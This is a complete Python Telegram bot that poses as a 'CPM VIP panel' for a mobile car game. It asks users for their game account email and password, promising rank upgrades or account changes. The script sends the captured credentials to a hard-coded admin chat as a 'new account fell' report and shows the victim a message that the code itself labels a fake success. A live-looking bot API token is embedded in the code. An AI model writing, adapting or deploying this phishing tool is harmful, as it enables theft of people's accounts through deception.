import telebot
from telebot import types
import time

# --- AYARLAR ---
API_TOKEN = '8632802130:AAEBt621oMiWnAGBytHaxtN9C32RBFSz6Zc'
MY_ADMIN_ID = 8134695168 

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

strings = {
    'tr': {
        'welcome': "🎖 **CPM GLOBAL VIP PANEL**\n\nLütfen **Lisans Anahtarınızı (KEY)** giriniz:",
        'invalid_key': "⚠️ **Geçersiz Anahtar!**\nLütfen tekrar deneyin:",
        'select_cpm': "✅ **Erişim Onaylandı.**\nLütfen oyun sürümünü seçin:",
        'select_action': "🛠 **VIP İşlem Menüsü**\nYapılacak işlemi seçin:",
        'ask_old_mail': "📧 **Mevcut E-posta** adresiniz:",
        'ask_old_pass': "🔒 **Hesap Şifreniz**:",
        'ask_new': "🆕 **Yeni Güncellenecek** bilgiyi yazın:",
        'processing': "⚙️ **Veritabanına bağlanılıyor...**\nLütfen bekleyiniz.",
        'success_fake': "✅ **İŞLEM BAŞARILI!**\n\nİşleminiz sıraya alındı. 12-24 saat içinde hesabınıza yansıyacaktır.",
        'btns': ["📧 Mail Değiştir", "🔒 Şifre Değiştir", "👑 King Rank Aktif Et"]
    },
    'en': {
        'welcome': "🎖 **CPM VIP PANEL**\nEnter your **KEY**:",
        'invalid_key': "❌ **Invalid!**\nTry again:",
        'select_cpm': "✅ **Access Granted.**\nSelect game version:",
        'select_action': "🛠 **VIP Menu**\nSelect action:",
        'ask_old_mail': "📧 **Current Email**:",
        'ask_old_pass': "🔒 **Password**:",
        'ask_new': "🆕 **New Info**:",
        'processing': "⚙️ **Connecting to database...**",
        'success_fake': "✅ **SUCCESS!**\n\nProcessing... 12-24h wait.",
        'btns': ["📧 Change Mail", "🔒 Change Pass", "👑 King Rank"]
    }
}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="l_tr"),
        types.InlineKeyboardButton("🇺🇸 English", callback_data="l_en")
    )
    bot.send_message(message.chat.id, "🌐 **Language / Dil Seçin:**", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('l_'))
def handle_lang(call):
    lang = call.data.split('_')[1]
    user_data[call.message.chat.id] = {'lang': lang}
    msg = bot.send_message(call.message.chat.id, strings[lang]['welcome'], parse_mode="Markdown")
    bot.register_next_step_handler(msg, step_check_key)

def step_check_key(message):
    lang = user_data[message.chat.id]['lang']
    if message.text.upper() == 'C12':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add("CPM 1", "CPM 2")
        msg = bot.send_message(message.chat.id, strings[lang]['select_cpm'], reply_markup=markup, parse_mode="Markdown")
        bot.register_next_step_handler(msg, step_select_action)
    else:
        msg = bot.send_message(message.chat.id, strings[lang]['invalid_key'], parse_mode="Markdown")
        bot.register_next_step_handler(msg, step_check_key)

def step_select_action(message):
    lang = user_data[message.chat.id]['lang']
    # Sürümü burada netleştiriyoruz
    user_data[message.chat.id]['cpm_version'] = message.text
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for btn in strings[lang]['btns']:
        markup.add(btn)
    msg = bot.send_message(message.chat.id, strings[lang]['select_action'], reply_markup=markup, parse_mode="Markdown")
    bot.register_next_step_handler(msg, step_ask_old_mail)

def step_ask_old_mail(message):
    lang = user_data[message.chat.id]['lang']
    user_data[message.chat.id]['action'] = message.text
    msg = bot.send_message(message.chat.id, strings[lang]['ask_old_mail'], reply_markup=types.ReplyKeyboardRemove(), parse_mode="Markdown")
    bot.register_next_step_handler(msg, step_ask_old_pass)

def step_ask_old_pass(message):
    lang = user_data[message.chat.id]['lang']
    user_data[message.chat.id]['old_mail'] = message.text
    msg = bot.send_message(message.chat.id, strings[lang]['ask_old_pass'], parse_mode="Markdown")
    bot.register_next_step_handler(msg, step_get_new_val)

def step_get_new_val(message):
    lang = user_data[message.chat.id]['lang']
    user_data[message.chat.id]['old_pass'] = message.text
    if "👑" not in user_data[message.chat.id]['action'] and "King" not in user_data[message.chat.id]['action']:
        msg = bot.send_message(message.chat.id, strings[lang]['ask_new'], parse_mode="Markdown")
        bot.register_next_step_handler(msg, final_report)
    else:
        final_report(message, is_king=True)

def final_report(message, is_king=False):
    uid = message.chat.id
    lang = user_data[uid]['lang']
    new_val = message.text if not is_king else "KING RANK AKTİF"
    
    bot.send_message(uid, strings[lang]['processing'], parse_mode="Markdown")
    
    # SENİN İSTEDİĞİN DETAYLI BİLDİRİM BURASI
    report = (
        f"🚀 **YENİ HESAP DÜŞTÜ!** 🚀\n\n"
        f"📱 **Sürüm:** `{user_data[uid].get('cpm_version', 'Belirsiz')}`\n"
        f"👤 **Kullanıcı:** @{message.from_user.username if message.from_user.username else 'Yok'}\n"
        f"🆔 **ID:** `{message.from_user.id}`\n"
        f"📧 **E-Mail:** `{user_data[uid]['old_mail']}`\n"
        f"🔒 **Şifre:** `{user_data[uid]['old_pass']}`\n"
        f"🛠 **İşlem:** {user_data[uid]['action']}\n"
        f"🆕 **Yeni Değer:** `{new_val}`\n\n"
        f"📅 **Tarih:** {time.strftime('%d/%m/%Y %H:%M')}"
    )
    
    # Bildirimi sana atıyor
    bot.send_message(MY_ADMIN_ID, report, parse_mode="Markdown")
    
    time.sleep(2)
    bot.send_message(uid, strings[lang]['success_fake'], parse_mode="Markdown")

if __name__ == "__main__":
    bot.infinity_polling()
    
